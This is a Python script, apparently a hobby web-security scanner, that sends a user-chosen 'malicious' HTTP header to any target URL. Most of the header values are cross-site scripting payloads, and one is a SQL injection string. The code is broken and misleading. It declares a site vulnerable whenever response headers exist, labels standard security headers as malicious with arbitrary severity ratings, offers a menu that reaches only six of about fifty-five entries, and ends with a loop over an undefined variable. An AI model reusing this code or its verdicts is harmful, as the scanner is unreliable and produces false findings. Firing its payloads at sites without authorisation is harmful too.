import requests
from bs4 import BeautifulSoup
from colorama import Fore, init
import pyfiglet

# Generate ASCII banner
ascii_banner = pyfiglet.figlet_format("CUSTOM HEADER VULNERABILITY")
print(ascii_banner)

# Initialize colorama for colored output
init(autoreset=True)

def test_custom_header_vulnerability(target_url, headers):
    """
    Test for Custom Header Vulnerability by sending a GET request with specified headers.

    Parameters:
        target_url (str): The URL of the target website.
        headers (dict): Custom headers to be included in the request.

    Returns:
        None
    """
    print(f"Testing Custom Header Vulnerability for: {target_url}")

    # Send a GET request to the target URL with custom headers
    response = requests.get(target_url, headers=headers)
    soup = BeautifulSoup(response.content, 'html.parser')

    if response.headers:
        # If response headers are present, the website may be vulnerable
        print(Fore.RED + "The target website is vulnerable to Custom Header Vulnerabilities!")
        print(Fore.RED + "To exploit this vulnerability, send a request with a custom header.")
    else:
        # If no response headers are present, the website is not vulnerable
        print(Fore.GREEN + "The target website is not vulnerable to Custom Header Vulnerabilities.")

    # Print the response headers for analysis
    print("Response Headers:")
    for header, value in response.headers.items():
        print(f"{header}: {value}")

if __name__ == "__main__":
    # Prompt the user to enter the target website URL
    target_website = input("Enter your target website URL:")

    # Predefined malicious headers for testing
    malicious_headers = {
        "X-XSS-Protection": "1; mode=block",
        "X-Content-Type-Options": "nosniff",
        "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
        "Content-Security-Policy": "default-src 'self'",
        "X-Frame-Options": "DENY",
        # Additional payloads
        "CH1": "<script>alert(1)</script>",
        "CH2": "' or 1=1--",
        "CH3": "<img src=x onerror=alert(1)>",
        "CH4": "" "><svg onload=alert(1)>",
        "CH5": "javascript:alert(1)",
        "CH6": "javascript:/*--></title></style></textarea></script></xmp><img src=x onerror=alert(1)>",
        "CH7": "<body onload=alert(1)>",
        "CH8": "<svg><script>/*<script* */alert(1)</script>",
        "CH9": "</script><svg onload=alert(1)>",
        "CH10": "<img src=1 href=1 onerror=alert(1) />",
        "CH11": "<script x> alert(1) </script 1>",
        "CH12": "<iframe src=javascript:alert(1)>",
        "CH13": "<a href=\"javascript:alert(1)\">XSS</a>",
        "CH14": "<img src=0 href=0 onerror=alert(1) />",
        "CH15": "<iframe srcdoc='&lt;script&gt;alert(1)&lt;/script&gt;'></iframe>",
        "CH16": "<svg/onload=alert(1)>",
        "CH17": "<form><button formaction=javascript:alert(1)>Click me</button></form>",
        "CH18": "<svg><script>alert(1)</script>",
        "CH19": "<svg><script x:href=javascript:alert(1)></script>",
        "CH20": "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSS');\">",
        "CH21": "<svg/onload=alert(1);alert(1)>",
        "CH22": "<svg><script>//&NewLine;confirm(1);//</script>",
        "CH23": "<script /* test */>confirm(1);</script /* test */>",
        "CH24": "<script /test/>confirm(1);</script /test/>",
        "CH25": "<svg><script x=\"&quot;,&quot;,&quot;,&quot;,&quot;;confirm(1)//\">",
        "CH26": "<iframe srcdoc=\"&lt;svg onload='javascript:alert(1)\"&gt;\">",
        "CH27": "<img src=x onerror=alert(1)//>",
        "CH28": "<svg/onload=alert(1)//>",
        "CH29": "<img src=x onerror=alert(1)//>",
        "CH30": "<svg/onload=alert(1)//>",
        "CH31": "<img src=x onerror=alert(1)//>",
        "CH32": "<svg/onload=alert(1)//>",
        "CH33": "<img src=x onerror=alert(1)//>",
        "CH34": "<svg/onload=alert(1)//>",
        "CH35": "<img src=x onerror=alert(1)//>",
        "CH36": "<svg/onload=alert(1)//>",
        "CH37": "<img src=x onerror=alert(1)//>",
        "CH38": "<svg/onload=alert(1)//>",
        "CH39": "<img src=x onerror=alert(1)//>",
        "CH40": "<svg/onload=alert(1)//>",
        "CH41": "<img src=x onerror=alert(1)//>",
        "CH42": "<svg/onload=alert(1)//>",
        "CH43": "<img src=x onerror=alert(1)//>",
        "CH44": "<svg/onload=alert(1)//>",
        "CH45": "<img src=x onerror=alert(1)//>",
        "CH46": "<svg/onload=alert(1)//>",
        "CH47": "<img src=x onerror=alert(1)//>",
        "CH48": "<svg/onload=alert(1)//>",
        "CH49": "<img src=x onerror=alert(1)//>",
        "CH50": "<svg/onload=alert(1)//>",
        # Add more payloads here...
    }

    # Display predefined malicious headers and option to add custom header
    print("Choose a predefined malicious header or add a new custom header:")
    print("Predefined Malicious Headers:")
    for index, (header, value) in enumerate(malicious_headers.items()):
        print(f"{index+1}. {header}: {value}")

    print("Custom Header Options:")
    print("6. Add a new custom header")

    # Prompt user for choice of header
    choice = input("Enter your choice (1-6):")

    if choice.isdigit() and 1 <= int(choice) <= 6:
        if int(choice) == 6:
            # If user chooses to add a custom header, prompt for header name and value
            custom_header = input("Enter custom header name:")
            custom_value = input("Enter custom header value:")
            headers = {custom_header: custom_value}
        else:
            # Use predefined malicious header based on user choice
            index = int(choice) - 1
            headers = {list(malicious_headers.keys())[index]: list(malicious_headers.values())[index]}
    else:
        # Display error message for invalid choice and exit
        print("Invalid choice! Exiting...")
        exit()

    # Call the function to test for Custom Header Vulnerabilities
    test_custom_header_vulnerability(target_website, headers)

# Vulnerability metrics for each payload
vulnerability_metrics = {
    "X-XSS-Protection": "medium",
    "X-Content-Type-Options": "high",
    "Strict-Transport-Security": "low",
    "Content-Security-Policy": "medium",
    "X-Frame-Options": "high",
    # Additional payloads
    "CH1": "high",
    "CH2": "high",
    "CH3": "high",
    "CH4": "high",
    "CH5": "high",
    "CH6": "high",
    "CH7": "high",
    "CH8": "high",
    "CH9": "high",
    "CH10": "high",
    "CH11": "high",
    "CH12": "high",
    "CH13": "high",
    "CH14": "high",
    "CH15": "high",
    "CH16": "high",
    "CH17": "high",
    "CH18": "high",
    "CH19": "high",
    "CH20": "high",
    "CH21": "high",
    "CH22": "high",
    "CH23": "high",
    "CH24": "high",
    "CH25": "high",
    "CH26": "high",
    "CH27": "high",
    "CH28": "high",
    "CH29": "high",
    "CH30": "high",
    "CH31": "high",
    "CH32": "high",
    "CH33": "high",
    "CH34": "high",
    "CH35": "high",
    "CH36": "high",
    "CH37": "high",
    "CH38": "high",
    "CH39": "high",
    "CH40": "high",
    "CH41": "high",
    "CH42": "high",
    "CH43": "high",
    "CH44": "high",
    "CH45": "high",
    "CH46": "high",
    "CH47": "high",
    "CH48": "high",
    "CH49": "high",
    "CH50": "high",
    # Add vulnerability metrics for more payloads here...
}


# Finding the successfully injected payload and its vulnerability metric
for header, metric in vulnerability_metrics.items():
    if header in response.headers:
        print("Successfully injected payload:", header)
        print("Vulnerability metric:", metric)
        break

